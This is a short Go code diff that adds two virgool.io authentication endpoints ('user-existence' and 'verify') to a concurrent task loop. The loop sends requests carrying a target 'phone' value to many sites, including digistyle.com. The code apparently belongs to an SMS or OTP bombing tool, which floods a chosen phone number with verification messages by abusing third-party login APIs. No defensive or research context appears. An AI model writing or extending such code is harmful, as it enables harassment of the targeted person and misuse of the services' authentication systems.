@@ -315,7 +315,19 @@ func main() {
 				"identifier": phone,
 			}, &wg, ch)
 		}
-
+		// virgool.io (JSON)
+		wg.Add(1)
+		tasks <- func() {
+			sendJSONRequest(ctx, "https://virgool.io/api/v1.4/auth/user-existence", map[string]interface{}{
+				"username": phone,
+			}, &wg, ch)
+		}
+		wg.Add(1) // virgool.io (JSON) 
+		tasks <- func() {
+			sendJSONRequest(ctx, "https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
+				"identifier": phone,
+			}, &wg, ch)
+		}
 		wg.Add(1) // digistyle.com (Form)
 		tasks <- func() {
 			formData := url.Values{}
